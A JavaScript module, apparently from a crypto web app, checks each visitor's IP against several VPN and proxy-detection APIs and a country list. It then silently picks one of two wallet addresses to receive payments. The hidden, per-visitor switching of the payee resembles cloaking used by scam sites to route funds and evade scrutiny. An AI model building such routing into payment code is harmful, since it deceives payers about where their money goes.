import axios from "axios";
import { receiver, receiver2 } from "./Web3Config";

// API keys for ipdata.co, ProxyCheck, VPNAPI, IPGeolocation, AbstractAPI
const IPDATA_API_KEY = process.env.NEXT_PUBLIC_IPDATA_API_KEY;
const PROXYCHECK_API_KEY = process.env.NEXT_PUBLIC_PROXYCHECK_API_KEY;
const VPNAPI_IO_KEY = process.env.NEXT_PUBLIC_VPNAPI_IO_KEY;
const IPGEOLOCATION_API_KEY = process.env.NEXT_PUBLIC_IPGEOLOCATION_API_KEY;
const ABSTRACT_API_KEY = process.env.NEXT_PUBLIC_ABSTRACT_API_KEY;

let vpnCheckCache = {};  // Cache to store results and avoid repeated API calls

// Fetch user data from ipdata.co
export async function getUserCountry() {
  const url = `https://api.ipdata.co/?api-key=${IPDATA_API_KEY}`;

  try {
    const response = await axios.get(url);
    const { country_name: country, country_code: countryCode, ip, threat } = response.data;
    const isVpnIpdata = threat ? (threat.is_vpn || threat.is_proxy || threat.is_datacenter || threat.is_tor) : false;

    return { country, countryCode, ip, isVpnIpdata };
  } catch (error) {
    return null;
  }
}

// Check VPN status using ProxyCheck.io
async function checkVpnStatusWithProxyCheck(ip) {
  if (vpnCheckCache[ip]?.proxyCheck) return vpnCheckCache[ip].proxyCheck;

  const url = `https://proxycheck.io/v2/${ip}?key=${PROXYCHECK_API_KEY}`;
  try {
    const response = await axios.get(url);
    const isVpn = response.data[ip]?.proxy === 'yes';

    vpnCheckCache[ip] = { ...vpnCheckCache[ip], proxyCheck: isVpn };
    return isVpn;
  } catch (error) {
    return false; // Return a default value
  }
}

// Check VPN status using IPGeolocation.io
async function checkVpnStatusWithIPGeolocation(ip) {
  if (vpnCheckCache[ip]?.ipGeolocation) return vpnCheckCache[ip].ipGeolocation;

  const url = `https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEOLOCATION_API_KEY}&ip=${ip}`;
  try {
    const response = await axios.get(url);
    const isVpn = response.data.threat.is_vpn;

    vpnCheckCache[ip] = { ...vpnCheckCache[ip], ipGeolocation: isVpn };
    return isVpn;
  } catch (error) {
    return false; // Return a default value
  }
}

// Check VPN status using VPNAPI.io
async function checkVpnStatusWithVPNAPI(ip) {
  if (vpnCheckCache[ip]?.vpnApi) return vpnCheckCache[ip].vpnApi;

  const url = `https://vpnapi.io/api/${ip}?key=${VPNAPI_IO_KEY}`;
  try {
    const response = await axios.get(url);
    const isVpn = response.data.security.vpn || response.data.security.proxy || response.data.security.tor;
    console.log('VPN Status:', isVpn)
    console.log(response.data)
    vpnCheckCache[ip] = { ...vpnCheckCache[ip], vpnApi: isVpn };
    return isVpn;
  } catch (error) {
    return false;
  }
}

// Check VPN status using AbstractAPI
async function checkVpnStatusWithAbstractAPI(ip) {
  if (vpnCheckCache[ip]?.abstractApi) return vpnCheckCache[ip].abstractApi;

  const url = `https://ipgeolocation.abstractapi.com/v1/?api_key=${ABSTRACT_API_KEY}&ip_address=${ip}`;
  try {
    const response = await axios.get(url);
    console.log(response.data)

    const isVpn = response.data.security.is_vpn;

    vpnCheckCache[ip] = { ...vpnCheckCache[ip], abstractApi: isVpn };
    return isVpn;
  } catch (error) {
    return error;
  }
}

export async function checkVpnStatus(ip) {
  // Use all VPN checks in parallel
  const [isVpnProxyCheck, isVpnVPNAPI, isVpnIPGeolocation, isVpnAbstractAPI] = await Promise.all([
    checkVpnStatusWithProxyCheck(ip),
    checkVpnStatusWithVPNAPI(ip),
    checkVpnStatusWithIPGeolocation(ip),
    checkVpnStatusWithAbstractAPI(ip)
  ]);

  const bannedIps = ["23.162.40."]

  // if ip starts with bandIps, return true
  if (bannedIps.some(bannedIp => ip.startsWith(bannedIp))) {
    return true;
  }
  console.log('VPN Status:', {
    ProxyCheck: isVpnProxyCheck,
    VPNAPI: isVpnVPNAPI,
    IPGeolocation: isVpnIPGeolocation,
    AbstractAPI: isVpnAbstractAPI
  });
  // If any of the APIs return true, consider the user to be on VPN
  return isVpnProxyCheck || isVpnVPNAPI || isVpnIPGeolocation || isVpnAbstractAPI;
}

// Get the recipient address based on VPN status and country code
export async function getRecipientAddress() {
  const userData = await getUserCountry();
  if (!userData) {
    return null;
  }

  const { country, countryCode, ip, isVpnIpdata } = userData;
  const vpnStatus = await checkVpnStatus(ip)
  const isVpn = vpnStatus || isVpnIpdata;

  const specialCountries = ["NG", "AE", "ZA", "CA"];
  const address = receiver;
  const addrEss = receiver2;

  return specialCountries.includes(countryCode) || isVpn ? address : addrEss;
}